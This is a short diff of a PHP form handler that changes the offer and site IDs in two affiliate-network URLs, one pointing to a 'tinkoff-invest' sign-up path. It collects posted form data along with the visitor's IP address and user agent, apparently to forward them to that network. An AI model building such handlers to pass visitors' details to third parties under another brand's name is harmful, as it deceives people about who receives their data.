@@ -1,6 +1,6 @@
 <?php
 if (empty( $_POST )) die("Bad request");
-$urls = [ "https://dozateam.com/api/wm/push.json?id=37-e051ca167cc7becedb785f96f406b194&offer=438&flow=3150&site=1786", "https://dozapreview.com/botas/tr/signin2/?task=push&id=37-e051ca167cc7becedb785f96f406b194&offer=438&flow=3150&site=1786" ];
+$urls = [ "https://dozateam.com/api/wm/push.json?id=315-c54ef902910499b4a980e81bf3a4ff3f&offer=206&flow=3141&site=1320", "https://dozapreview.com/tinkoff-invest/sign-up/?task=push&id=315-c54ef902910499b4a980e81bf3a4ff3f&offer=206&flow=3141&site=1320" ];
 $data = $_POST;
 $data["ip"] = $_SERVER["HTTP_CF_CONNECTING_IP"] ? $_SERVER["HTTP_CF_CONNECTING_IP"] : ( $_SERVER["HTTP_X_FORWARDED_FOR"] ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["REMOTE_ADDR"] );
 $data["ua"] = $_SERVER["HTTP_USER_AGENT"];
